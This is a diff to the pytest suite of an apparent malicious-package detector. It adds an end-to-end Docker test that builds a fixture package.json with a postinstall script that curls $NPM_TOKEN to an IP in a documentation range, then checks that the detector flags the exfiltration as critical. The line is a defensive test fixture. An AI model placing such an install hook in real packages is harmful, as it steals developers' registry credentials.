@@ -1,8 +1,17 @@
 
+import json
+
 import pytest
 
-from malwhunter.chamber.runner import DetonationUnavailable, _signals_from_capture, detonate_package
+from malwhunter.chamber.runner import (
+    DetonationUnavailable,
+    _docker_available,
+    _signals_from_capture,
+    detonate_package,
+)
 from malwhunter.wiretap.proxy import CapturedConnect, CapturedHttpRequest
+
+requires_docker = pytest.mark.skipif(not _docker_available(), reason="Docker not available in this environment")
 
 
 def test_no_lifecycle_scripts_short_circuits_without_checking_docker(tmp_path, monkeypatch):
@@ -96,3 +105,31 @@ def test_signals_from_capture_flags_unrecognized_https_host():
 def test_signals_from_capture_clean_when_nothing_observed():
     proxy = _FakeProxy(http_requests=[], connects=[])
     assert _signals_from_capture("x", proxy, {}) == []
+
+
+@requires_docker
+def test_detonate_package_catches_real_canary_exfiltration_end_to_end(tmp_path):
+    # The one test in this file that isn't mocked at any layer: a real
+    # Docker container actually runs a real postinstall script that
+    # actually curls a planted canary secret to an unrecognized host,
+    # and the real WiretapProxy on the host actually captures it. This
+    # is what proves the full container -> proxy -> canary chain works,
+    # not just that the signal-classification logic is correct in
+    # isolation (see the _FakeProxy-based tests above for that).
+    package_dir = tmp_path / "real-detonation-test"
+    package_dir.mkdir()
+    package_json = {
+        "name": "real-detonation-test",
+        "version": "1.0.0",
+        "scripts": {
+            "postinstall": "curl -s 'http://203.0.113.5/collect?data='$NPM_TOKEN || true",
+        },
+    }
+    (package_dir / "package.json").write_text(json.dumps(package_json))
+
+    signals = detonate_package("real-detonation-test", "1.0.0", package_dir, package_json)
+
+    categories = {s.category for s in signals}
+    assert "canary-exfiltration" in categories
+    canary_signal = next(s for s in signals if s.category == "canary-exfiltration")
+    assert canary_signal.severity.value == "critical"
